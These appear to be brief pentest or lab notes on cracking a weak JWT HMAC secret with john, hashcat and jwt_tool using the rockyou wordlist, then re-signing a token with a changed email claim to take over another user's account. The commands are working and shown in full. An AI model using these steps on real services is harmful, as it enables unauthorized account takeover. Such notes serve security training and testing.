use crunch or rockyou etc for lists
crunch 5 5 > pass.txt

Make a user. Take their JWT token and attempt cracking it like so:
`john --wordlist=/usr/share/wordlists/rockyou.txt jwt --format=HMAC-SHA512 --fork=4` 

![unnamed_191f13da30d945c9a52917498285eb82](unnamed_191f13da30d945c9a52917498285eb82.png)

Or like so: 
`jwt_tool eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJiQGIuY29tIiwiaWF0IjoxNjY4ODEwNDE1LCJleHAiOjE2Njg4OTY4MTV9.MsWAWE_9SaFUlFnnJM_RAk1egQcD9JMNaETPEZ-myrOaynYyPeVvXCUfE5MfzfD3ob2TWJz00OxBFTwdb5h0tA -C -d /home/kali/ja`

![unnamed_72d19497ff6d443b8dd03097b59d3c68](unnamed_72d19497ff6d443b8dd03097b59d3c68.png)
Now, what you can do is this:
- You're logged in as this user with this token:
![unnamed_6366043b1aaa4a6692b280b36e1ae64b](unnamed_6366043b1aaa4a6692b280b36e1ae64b.png)
https://jwt.io/
![unnamed_b40a901a51f0405ea81f6cc4b1d7e5dc](unnamed_b40a901a51f0405ea81f6cc4b1d7e5dc.png)
Let's now modify the email to another user, and see if we can access their account, even though we don't know their password.
![unnamed_12c411180fe84e689a1a7a1ce8d2e3da](unnamed_12c411180fe84e689a1a7a1ce8d2e3da.png)
We tried changing to a@a.com, but no luck.

Let's modify the token in jwt again but this time use the password from the API provider for the signature that we cracked.
![unnamed_fba36039a1984112b72c931886264d48](unnamed_fba36039a1984112b72c931886264d48.png)
 And BAM, this allows us to perform an account takeover without their password.![unnamed_37a34cd8286e4f40979295dbd6dfbfa2](unnamed_37a34cd8286e4f40979295dbd6dfbfa2.png)

Hashcat syntax:
`hashcat -m 16500 jwt /usr/share/wordlists/rockyou.txt` 
![unnamed_925f50fc34d949558cd1789b50424f56](unnamed_925f50fc34d949558cd1789b50424f56.png)